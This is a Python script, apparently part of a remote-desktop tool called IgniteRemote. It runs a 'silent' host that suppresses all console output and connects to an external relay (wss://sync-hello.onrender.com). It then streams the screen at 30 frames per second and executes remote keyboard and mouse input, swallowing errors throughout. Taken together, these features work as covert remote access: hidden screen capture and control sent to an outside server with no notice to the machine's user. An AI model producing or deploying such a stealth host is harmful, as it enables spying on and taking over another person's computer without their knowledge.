#!/usr/bin/env python3
"""
bankai_silent_host.py - Silent headless host for IgniteRemote

This script creates a relay session with session ID "BANKAI", connects as host,
and streams screen captures silently in the background without any console output.

Usage:
  py -3 bankai_silent_host.py

Runs completely silently - writes session info to bankai_session.txt file
and any errors to bankai_error.log.
"""
import sys
import time
import threading
import os

from relay_client import RelayClient
from optimized_capture import OptimizedScreenCapture, OptimizedInputHandler


def main():
    # Redirect stdout/stderr to suppress all console output
    sys.stdout = open(os.devnull, 'w', encoding='utf-8')
    sys.stderr = open(os.devnull, 'w', encoding='utf-8')
    
    try:
        session_id = "BANKAI"
        
        relay = RelayClient("wss://sync-hello.onrender.com")
        capture = OptimizedScreenCapture()
        input_handler = OptimizedInputHandler()
        
        # Callbacks (silent)
        def on_screen_data(data):
            pass  # Host doesn't expect screen data
            
        def on_input_data(data):
            try:
                input_handler.handle_remote_input(data)
            except:
                pass  # Silent
                
        def on_conn(status):
            pass  # Silent
        
        relay.on_screen_data = on_screen_data
        relay.on_input_data = on_input_data
        relay.on_connection_change = on_conn
        
        # Try to create session with custom ID
        # Note: relay might generate its own ID, but we'll try
        created_session = relay.create_session()
        if not created_session:
            # Write error to log file
            with open("bankai_error.log", "w", encoding='utf-8') as f:
                f.write("Failed to create session\n")
            return
        
        # Write session ID to file for clients to find
        with open("bankai_session.txt", "w", encoding='utf-8') as f:
            f.write(f"{created_session}\n")
        
        # Connect as host
        if not relay.connect_as_host():
            with open("bankai_error.log", "w", encoding='utf-8') as f:
                f.write("Failed to connect as host\n")
            return
        
        # Start capture loop in background thread
        def capture_loop():
            try:
                while relay.is_connected() and relay.role == 'host':
                    screen = capture.capture_screen()
                    if screen and 'data' in screen:
                        try:
                            relay.send_screen_data(screen['data'])
                        except:
                            pass  # Silent
                    time.sleep(1/30)  # 30 FPS
            except:
                pass  # Silent
        
        t = threading.Thread(target=capture_loop, daemon=True)
        t.start()
        
        # Keep main thread alive while background capture runs
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        pass  # Silent exit
    except Exception as e:
        # Write any critical errors to log
        try:
            with open("bankai_error.log", "w", encoding='utf-8') as f:
                f.write(f"Critical error: {str(e)}\n")
        except:
            pass
    finally:
        try:
            relay.disconnect()
            # Clean up session file on exit
            if os.path.exists("bankai_session.txt"):
                os.remove("bankai_session.txt")
        except:
            pass


if __name__ == "__main__":
    main()